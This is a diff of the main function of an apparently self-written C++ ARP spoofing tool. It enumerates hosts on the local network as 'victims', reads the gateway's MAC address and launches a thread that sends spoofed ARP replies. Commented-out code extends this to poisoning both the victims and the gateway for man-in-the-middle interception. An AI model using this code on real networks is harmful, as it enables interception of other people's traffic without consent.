@@ -14,7 +14,7 @@ int main (int argc, char **argv) {
   cout << "IP\t\tMAC\n";
   cout << "---------------------------------------\n";
 
-  std::map<string, string> arp_table;
+  map<string, string> arp_table;
 
   // get gateway ip
   char *cmd = new char[100];
@@ -29,20 +29,40 @@ int main (int argc, char **argv) {
 
   uint32_t dst_ip = inet_addr(gwip);
   test_arp(ifname.c_str(), dst_ip, arp_table);
-  std::vector<std::string> victims;
-  //std::string gwmac;
+  vector<string> victims;
   // ip -> mac (map)
-  for(std::map<string, string>::iterator it = arp_table.begin(); it != arp_table.end(); it++) {
-    cout << it->first << '\t' << it->second << '\n';
+  for(map<string, string>::iterator it = arp_table.begin(); it != arp_table.end(); it++) {
     if(it->first != gwip) {
+      cout << it->first << '\t' << it->second << '\n';
       victims.push_back(it->first);
-      //gwmac = it->second;
     }
   }
 
-  // create thread to send arp reply to spoof the gateway
-  //thread t1(send_arp, ifname, victims[0], gwip);
-  // create thread to send arp reply to spoof the victim
+  // get my ip and mac
+  // uint32_t my_ip;
+  // int ifindex;
+  //unsigned char my_mac[6];
+  //get_if_info(ifname.c_str(), &my_ip, my_mac, &ifindex);
+  unsigned char *gw_mac = new unsigned char[6];
+  str2mac(arp_table[gwip].c_str(), gw_mac);
+  // thread_reply(ifname.c_str(), victims, arp_table, gw_mac, inet_addr(gwip));
+  thread t1 = thread(thread_reply, ifname.c_str(), victims, arp_table, gw_mac, inet_addr(gwip));
+  t1.join();
+
+  // thread thrds2vct[victims.size()];
+  // thread thrds2gw[victims.size()];
+  
+  // // create thread to send arp reply to spoof victim and gateway
+  // for(uint i = 0; i < victims.size(); i++) {
+  //   unsigned char *vctm_mac = new unsigned char[6];
+  //   str2mac(arp_table[victims[i]].c_str(), vctm_mac);
+  //   thrds2vct[i] = thread(thread_reply, ifindex, my_mac, vctm_mac, inet_addr(gwip), inet_addr(victims[i].c_str()));
+  //   thrds2gw[i] = thread(thread_reply, ifindex, my_mac, gw_mac, inet_addr(victims[i].c_str()), inet_addr(gwip));
+  // }
+  // for(uint i = 0; i < victims.size(); i++) {
+  //   thrds2vct[i].join();
+  //   thrds2gw[i].join();
+  // }
 
   return (EXIT_SUCCESS);
 }
